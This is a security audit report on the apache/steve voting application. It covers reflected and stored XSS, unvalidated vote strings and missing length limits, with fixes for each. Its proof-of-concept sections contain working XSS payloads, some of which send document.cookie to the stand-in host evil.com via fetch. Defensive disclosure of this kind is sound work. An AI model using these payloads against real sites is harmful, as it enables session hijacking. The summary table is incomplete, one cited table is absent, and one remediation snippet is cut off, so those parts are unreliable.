# ASVS 1.3.3 Security Audit Report: apache/steve

## Executive Summary

**Repository:** apache/steve  
**Audit Date:** Apr 23, 2026  
**Auditor:** Tooling Agents  
**ASVS Requirement:** 1.3.3 — Verify that data being passed to a potentially dangerous context is sanitized beforehand to enforce safety measures, such as only allowing characters which are safe for this context and trimming input which is too long.  
**Level:** 2  
**Section:** Sanitization

**Files Analyzed:** 7 relevant out of 49 total, 12 skipped

**Finding Summary:**

| Severity | Count | IDs |
|----------|-------|-----|
| Critical | 0 | — |

| Medium | 2 | ASVS-133-MEDIUM-004, ASVS-133-MEDIUM-005 |
| Low | 0 | — |
| **Total** | **5** | |

**Key Finding:** The audit revealed significant sanitization gaps where user-controlled data enters dangerous contexts (HTML rendering, JavaScript embedding) without proper encoding or sanitization. The EZT templating engine does NOT auto-escape output, requiring explicit `[format]` directives. While the `[format "js,html"]` control IS used in some onclick handlers, it is absent from the majority of template output locations—a classic Type B coverage gap that creates false confidence in the application'''s XSS protections.

## Findings

### ASVS-133-HIGH-001: Reflected XSS via Unsanitized URL Path Parameters in Error Templates

**Severity:** HIGH  
**Gap Type:** Type A (Entry point with NO control)

**Location:**
- **File:** `v3/server/templates/e_bad_eid.ezt`, line 8
- **File:** `v3/server/templates/e_bad_iid.ezt`, line 8
- **Function:** `load_election()` and `load_election_issue()` decorators in `v3/server/pages.py`

**Related Functions Checked:**
- `load_election()` decorator (~line 170)
- `load_election_issue()` decorator
- `raise_404()` helper
- Error template rendering

**Description:**

URL path parameters (`eid`, `iid`) are accepted from user-controlled routes and rendered directly into error templates without sanitization or HTML encoding. The EZT template engine outputs these values as raw HTML without applying any `[format]` directive.

**Vulnerable Code:**

`e_bad_eid.ezt:8`:
```html
The Election ID ([eid]) does not exist,
```

`e_bad_iid.ezt:8`:
```html
The Issue ID ([iid]) does not exist, or you do not
```

**Data Flow:**
```
URL path parameter (attacker-controlled)
  → pages.py load_election() decorator, line ~170: result.eid = eid
  → raise_404(T_BAD_EID, result)
  → EZT renders [eid] as raw HTML (no format directive)
  → Reflected in HTTP response body
```

**Source:** `eid` from Quart route `<eid>` – accepts any string except `/`, including `<script>` tags after URL decoding.

**Sink:** EZT template `[eid]` output rendered as raw HTML in the response.

**Missing Control:** No `[format "html"]` directive applied; no server-side sanitization of `eid` before template rendering.

**Proof of Concept:**
```http
GET /vote-on/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E HTTP/1.1
Host: target
Cookie: [valid session cookie]
```

The server decodes `%3Cimg...%3E` to `<img src=x onerror=alert(document.cookie)>`, passes to `Election.__init__()`, which raises `ElectionNotFound`, and the error template renders the payload as live HTML.

The same applies to `/manage-stv/<eid>/<iid>` with a valid EID but malicious IID:
```http
GET /manage-stv/VALID_EID/%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
```

**Impact:** Session hijacking of authenticated committers via crafted links. An attacker distributes a link that, when clicked by an authenticated user, executes JavaScript in the application'''s origin.

**Remediation:**

Apply HTML escaping in templates:
```html
[# e_bad_eid.ezt – apply HTML escaping ]
The Election ID ([format "html"][eid][end]) does not exist,
```

```html
[# e_bad_iid.ezt – apply HTML escaping ]
The Issue ID ([format "html"][iid][end]) does not exist,
```

Additionally, validate `eid`/`iid` format early in the decorator:
```python
import re

EID_PATTERN = re.compile(r'''^[a-zA-Z0-9_-]+$''')

def load_election(func):
    @functools.wraps(func)
    async def loader(eid):
        if not EID_PATTERN.match(eid) or len(eid) > 64:
            quart.abort(400, '''Invalid election ID format''')
        # ... rest of function
```

### ASVS-133-HIGH-002: Stored XSS via Missing Output Encoding in HTML Context Across Templates

**Severity:** HIGH  
**Gap Type:** Type B (Control EXISTS in `[format "js,html"]` but NOT CALLED at most HTML output points)

**Location:**
- **File:** `v3/server/templates/vote-on.ezt` – lines with `<strong>[issues.title]</strong>` and `[issues.description]`
- **File:** `v3/server/templates/manage.ezt` – lines with `<strong>[issues.title]</strong>` and description div
- **File:** `v3/server/templates/manage-stv.ezt` – same patterns
- **File:** `v3/server/templates/voter.ezt` – lines with `[open_elections.title]`, `[upcoming_elections.title]`
- **File:** `v3/server/templates/admin.ezt` – line with `[owned.title]`

**Related Functions Checked:**
- `do_add_issue_endpoint()` in `v3/server/pages.py` (~line 464)
- `do_edit_issue_endpoint()` in `v3/server/pages.py` (~line 479)
- `do_create_endpoint()` in `v3/server/pages.py` (~line 398)
- `election.add_issue()` in `v3/steve/election.py`
- `election.list_issues()` in `v3/steve/election.py`

**Description:**

User-supplied election titles, issue titles, and issue descriptions are stored in the database without sanitization and rendered in multiple templates without HTML encoding. The `[format "js,html"]` directive IS correctly used for onclick handler values in the same templates, but is NOT applied to HTML body output of the same data—creating a Type B coverage gap where the control exists but is inconsistently applied.

**Vulnerable Code:**

`manage.ezt`:
```html
<strong>[issues.title]</strong>
...
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

`voter.ezt`:
```html
<h5 class="card-title mb-3">[open_elections.title]</h5>
```

`admin.ezt`:
```html
<h5 class="card-title">[owned.title]</h5>
```

**Data Flow:**
```
Form POST /do-add-issue/<eid>
  → pages.py do_add_issue_endpoint(), line ~464: form.title, form.description (no sanitization)
  → election.add_issue(form.title, form.description, vtype, kv) (no sanitization)
  → Stored in SQLite issue table
  → Retrieved by election.list_issues()
  → Rendered in templates as [issues.title], [issues.description] WITHOUT [format "html"]
  → Served to ALL users viewing the election
```

**Source:** `form.title` and `form.description` from HTML form POST.

**Sink:** EZT `[issues.title]` and `[issues.description]` rendered as raw HTML to all viewers.

**Missing Control:** The `[format "js,html"]` directive IS used for onclick handler values in the same templates but is NOT applied to the HTML body output of the same data. This creates false confidence that escaping is handled.

**Evidence of Type B Gap (control exists but not applied):**
```html
[# ESCAPING IS APPLIED HERE (manage.ezt): ]
onclick="openEditIssueModal('''[issues.iid]''',
                            '''[format "js,html"][issues.title][end]''',
                            '''[format "js,html"][issues.description][end]''')"

[# BUT NOT APPLIED HERE in the same file: ]
<strong>[issues.title]</strong>
<div class="description mt-2">[issues.description]</div>
```

**Proof of Concept:**
```http
POST /do-add-issue/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: [valid committer session]

title=<img+src=x+onerror=fetch('''https://evil.com/steal?c='''+document.cookie)>&description=test
```

Any user viewing `/manage/VALID_EID` or `/vote-on/VALID_EID` will execute the JavaScript.

**Impact:** Stored XSS affecting all voters and administrators viewing any election containing the malicious issue. A committer-level attacker can steal sessions of other committers and PMC members, or manipulate the voting interface.

**Remediation:**

Apply `[format "html"]` to ALL user-sourced data in HTML body context:

```html
[# manage.ezt, manage-stv.ezt, vote-on.ezt: ]
<strong>[format "html"][issues.title][end]</strong>
<div class="description mt-2">[format "html"][issues.description][end]</div>

[# voter.ezt: ]
<h5 class="card-title mb-3">[format "html"][open_elections.title][end]</h5>

[# admin.ezt: ]
<h5 class="card-title">[format "html"][owned.title][end]</h5>
```

Additionally, add server-side sanitization as defense-in-depth in `pages.py`:
```python
import html

MAX_TITLE_LEN = 200
MAX_DESC_LEN = 5000

@APP.post('''/do-add-issue/<eid>''')
@asfquart.auth.require({R.committer})
@load_election
async def do_add_issue_endpoint(election):
    form = edict(await quart.request.form)
    title = form.title.strip()[:MAX_TITLE_LEN]
    description = (form.description or '''''').strip()[:MAX_DESC_LEN]
    if not title:
        await flash_danger('''Title is required.''')
        return quart.redirect(f'''/manage/{election.eid}''', code=303)
    # ... proceed with sanitized values
```

### ASVS-133-HIGH-003: Stored XSS via Unsanitized Data Embedded in JavaScript Context

**Severity:** HIGH  
**Gap Type:** Type A (Entry point with NO control in JavaScript context)

**Location:**
- **File:** `v3/server/templates/vote-on.ezt`, JavaScript block near bottom

**Related Functions Checked:**
- `vote_on_page()` in `v3/server/pages.py`
- `election.list_issues()` in `v3/steve/election.py`
- STV issue creation in `create-election.py`
- `yaml.safe_load()` processing

**Description:**

Issue titles and candidate data for STV elections are embedded directly into JavaScript object literals in a `<script>` block without any escaping. This allows breaking out of string literals and executing arbitrary JavaScript code.

**Vulnerable Code:**

`vote-on.ezt`:
```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
[for issues.candidates]        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
[end]      ]
    },
[end][end]  };
```

**Data Flow:**
```
Issue title/candidate data (set by admin via CLI or future web form)
  → Stored in SQLite (issue table, kv JSON column)
  → Retrieved by election.list_issues() in vote_on_page()
  → Embedded in JavaScript object literal WITHOUT [format "js"] or [format "js,html"]
  → Executed in voter'''s browser
```

**Source:** `issues.title`, `issues.candidates.label`, `issues.candidates.name` from database.

**Sink:** Embedded inside JavaScript string literals in `<script>` block without any escaping.

**Missing Control:** No `[format "js"]` or `[format "js,html"]` directive applied. The `escapeHtml()` JavaScript function defined later in the same file is only used for DOM manipulation, not for the server-rendered data injection.

**Proof of Concept:**

If an STV issue has a title of:
```
test", alert: (function(){fetch('''https://evil.com/'''+document.cookie)})() //
```

The rendered JavaScript becomes:
```javascript
title: "test", alert: (function(){fetch('''https://evil.com/'''+document.cookie)})() //",
```

This breaks out of the string literal and executes arbitrary code.

While STV issues are currently only created via CLI (`create-election.py`), the YAML data is loaded via `yaml.safe_load()` and no output encoding is applied to the title before template rendering. Additionally, if STV creation is added to the web interface (as indicated by TODO comments in `do_add_issue_endpoint`), this becomes directly web-exploitable.

**Impact:** JavaScript execution in the context of every voter viewing an STV election. Session theft, vote manipulation, or voter impersonation.

**Remediation:**

```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[format "js"][issues.iid][end]": {
      seats: parseInt("[format "js"][issues.seats][end]"),
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
[end][end]  };
```

### ASVS-133-MEDIUM-004: Missing Vote Data Sanitization Before Encryption and Storage

**Severity:** MEDIUM  
**Gap Type:** Type A (No validation control at entry point)

**Location:**
- **File:** `v3/steve/election.py`, `add_vote()` method, lines ~269–287
- **File:** `v3/server/pages.py`, `do_vote_endpoint()`, lines ~353–389

**Related Functions Checked:**
- `add_vote()` in `v3/steve/election.py`
- `do_vote_endpoint()` in `v3/server/pages.py`
- `crypto.create_vote()` in `v3/steve/crypto.py`
- Vote type modules in `v3/steve/vtypes/`

**Description:**

Vote strings submitted via web forms are accepted without validation of format or length. The code contains an explicit TODO comment acknowledging this gap: `### validate VOTESTRING for ISSUE.TYPE voting`. Invalid vote data is encrypted and stored, potentially corrupting tally results when decrypted.

**Vulnerable Code:**

`election.py`:
```python
def add_vote(self, pid: str, iid: str, votestring: str):
    "Add VOTESTRING as the (latest) vote by PID for IID."

    # The Election should be open.
    md = self._all_metadata(self.S_OPEN)

    ### validate VOTESTRING for ISSUE.TYPE voting    # <-- TODO comment, no implementation

    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)
    self.c_add_vote.perform(vote_token, ciphertext)
```

`pages.py`:
```python
for key, value in form.items():
    if key.startswith('''vote-'''):
        iid = key.split('''-''', 1)[1]
        votes[iid] = value
# ...
for iid, votestring in votes.items():
    # No validation of votestring format
    election.add_vote(result.uid, iid, votestring)
```

**Data Flow:**
```
Form POST /do-vote/<eid>
  → pages.py: form field "vote-<iid>" value extracted as votestring (no validation)
  → election.add_vote(uid, iid, votestring) (acknowledged TODO: no validation)
  → Encrypted and stored in vote table
  → During tally: decrypted and passed to vtypes module
  → Invalid format may corrupt tally results
```

**Source:** Form field values from POST body—attacker fully controls the string.

**Sink:** Votestring encrypted and stored, later decrypted and processed by tallying logic.

**Missing Control:** No whitelist validation for YNA votes (should be exactly `y`, `n`, or `a`). No format validation for STV votes (should be comma-separated valid candidate labels). No length limit.

**Proof of Concept:**
```http
POST /do-vote/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: [valid session]

vote-VALID_IID=AAAA...AAAA[100000 chars]&vote-VALID_IID2=xyz_invalid
```

For YNA: submitting `xyz_invalid` instead of `y/n/a` will be encrypted and stored. During tally, the vtypes module receives an invalid vote that may cause errors or skew results.

For STV: submitting labels not in the labelmap or duplicated labels could corrupt the STV tally.

**Impact:** Vote data integrity compromise. Invalid votes stored in encrypted form become difficult to detect until tally time, potentially invalidating election results.

**Remediation:**

Add validation in `election.py` `add_vote()`:
```python
def add_vote(self, pid: str, iid: str, votestring: str):
    md = self._all_metadata(self.S_OPEN)

    # Validate votestring format for the issue type
    issue = self.q_get_issue.first_row(iid)
    if not issue:
        raise IssueNotFound(iid)
    
    vtype_mod = vtypes.vtype_module(issue.type)
    kv = self.json2kv(issue.kv)
    if not vtype_mod.validate_vote(votestring, kv):
        raise InvalidVote(iid, votestring)

    # Enforce length limit
    if len(votestring) > 1024:
        raise InvalidVote(iid, '''vote too long''')

    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)
    self.c_add_vote.perform(vote_token, ciphertext)
```

Example YNA validation:
```python
# In vtypes/yna.py
VALID_YNA = {'''y''', '''n''', '''a'''}

def validate_vote(votestring, kv=None):
    return votestring in VALID_YNA
```

Example STV validation:
```python
# In vtypes/stv.py
def validate_vote(votestring, kv):
    if not votestring:
        return False
    labels = votestring.split(''',''')
    valid_labels = set(kv.get('''labelmap''', {}).keys())
    # Check all labels are valid and unique
    return (all(l in valid_labels for l in labels)
            and len(labels) == len(set(labels)))
```

### ASVS-133-MEDIUM-005: No Input Length Limits on User-Supplied Text Fields

**Severity:** MEDIUM  
**Gap Type:** Type A (No length sanitization control)

**Location:**
- **File:** `v3/server/pages.py`, `do_create_endpoint()`, line ~398
- **File:** `v3/server/pages.py`, `do_add_issue_endpoint()`, line ~457
- **File:** `v3/server/pages.py`, `do_edit_issue_endpoint()`, line ~479
- **File:** `v3/server/templates/admin.ezt` – election title input (no `maxlength`)
- **File:** `v3/server/templates/manage.ezt` – issue title/description inputs (no `maxlength`)

**Related Functions Checked:**
- `do_create_endpoint()` in `v3/server/pages.py`
- `do_add_issue_endpoint()` in `v3/server/pages.py`
- `do_edit_issue_endpoint()` in `v3/server/pages.py`
- `Election.create()` in `v3/steve/election.py`
- `election.add_issue()` in `v3/steve/election.py`

**Description:**

ASVS 1.3.3 specifically requires "trimming input which is too long." No server-side length limits exist on any text input field (election titles, issue titles, issue descriptions). No client-side `maxlength` attributes are set on form inputs. This allows arbitrarily long inputs to be stored and rendered.

**Vulnerable Code:**

`pages.py do_create_endpoint`:
```python
form = edict(await quart.request.form)
election = steve.election.Election.create(DB_FNAME, form.title, result.uid)
```

`pages.py do_add_issue_endpoint`:
```python
form = edict(await quart.request.form)
iid = election.add_issue(form.title, form.description, vtype, kv)
```

`admin.ezt`:
```html
<input type="text" class="form-control" id="electionTitle" name="title" required
       aria-describedby="electionTitleHelp">
[# No maxlength attribute ]
```

**Data Flow:**
```
Form POST with arbitrarily long title/description
  → pages.py: form data parsed with no length check
  → election.py: stored directly in SQLite TEXT columns
  → Retrieved and rendered in templates
```

**Missing Control:** No server-side length validation. No client-side `maxlength` attributes. SQLite TEXT columns accept up to 1 billion characters.

**Impact:** Excessively long inputs could cause storage bloat, slow template rendering, and contribute to denial of service. Combined with the XSS findings above, very long payloads increase the impact of injection attacks.

**Remediation:**

Server-side enforcement in `pages.py`:
```python
MAX_ELECTION_TITLE = 200
MAX_ISSUE_TITLE = 200
MAX_ISSUE_DESCRIPTION = 10000

@APP.post('''/do-create-election''')
@asfquart.auth.require({R.pmc_member})
```

## Positive Security Patterns

1. **Parameterized SQL Queries (queries.yaml):** All 30+ queries use `?` placeholders. The `asfpy.db` wrapper enforces parameter binding. No string concatenation in SQL construction.

2. **Hardcoded LDAP Filter (asf-load-ldap.py:46):** The LDAP search filter `'''uid=*'''` is a constant string, preventing LDAP injection. User data flows FROM LDAP INTO the system, not from users INTO LDAP queries.

3. **Partial EZT Escaping in onclick Handlers (manage.ezt, manage-stv.ezt):** The `[format "js,html"]` directive IS correctly applied when embedding issue data in JavaScript string contexts within HTML onclick attributes. This demonstrates developer awareness of the control.

4. **Client-side escapeHtml in STV Modal (vote-on.ezt):** The JavaScript `escapeHtml()` function is used in `makeItem()` when dynamically inserting candidate names into the DOM, preventing DOM-based XSS in the drag-and-drop interface.

5. **Cryptographic ID Generation:** Election IDs (EIDs) and Issue IDs (IIDs) are generated via `crypto.create_id()` producing random values safe for HTML attribute inclusion, eliminating injection risk from these identifiers in templates.

6. **Framework File Serving (pages.py serve_doc):** Use of `quart.send_from_directory()` provides path traversal protection for the `docname` parameter via internal `safe_join()`.

7. **Safe YAML Loading (create-election.py):** Use of `yaml.safe_load()` instead of `yaml.load()` prevents YAML deserialization attacks.

8. **Vote Type Whitelist (election.py):** `assert vtype in vtypes.TYPES` provides server-side enforcement of allowed vote types during issue creation.

## Architecture Observations

1. **EZT Does Not Auto-Escape:** Unlike modern frameworks (Jinja2, Django templates), EZT outputs values as-is by default. Every user-sourced value requires explicit `[format]` directives. This architectural choice places a high burden on developers and makes XSS omissions likely.

2. **No Centralized Input Sanitization Layer:** There is no middleware or utility function that sanitizes/validates form inputs before they reach business logic. Each endpoint handles raw form data directly via `edict(await quart.request.form)`.

3. **Acknowledged Technical Debt:** The codebase contains 15+ `### check authz` TODO comments and explicit `### validate VOTESTRING` notes, indicating the developers are aware of missing controls but have not yet implemented them.

## Recommendations Summary

### Immediate Actions (Priority 1 – HIGH Findings)

1. **Apply `[format "html"]` to ALL user-sourced data in HTML body contexts** across all EZT templates. Conduct a systematic review using the coverage table above.

2. **Apply `[format "js"]` to ALL data embedded in `<script>` blocks**, particularly the STV_CANDIDATES object in `vote-on.ezt`.

3. **Sanitize URL path parameters** (`eid`, `iid`) with a character whitelist regex before any template rendering.

### Short-term Actions (Priority 2 – MEDIUM Findings)

4. **Implement votestring validation** in `election.py` `add_vote()` with type-specific validators.

5. **Add server-side length limits** on all text inputs (titles, descriptions) and enforce with `maxlength` in HTML forms.

### Long-term Actions (Priority 3 – Architectural)

6. **Consider migrating to an auto-escaping template engine** (e.g., Jinja2 with `autoescape=True`) to eliminate the class of XSS vulnerabilities caused by EZT'''s raw-output default.

7. **Create a centralized input sanitization utility** that trims whitespace, enforces length limits, and strips or rejects dangerous characters, called from all form-handling endpoints.
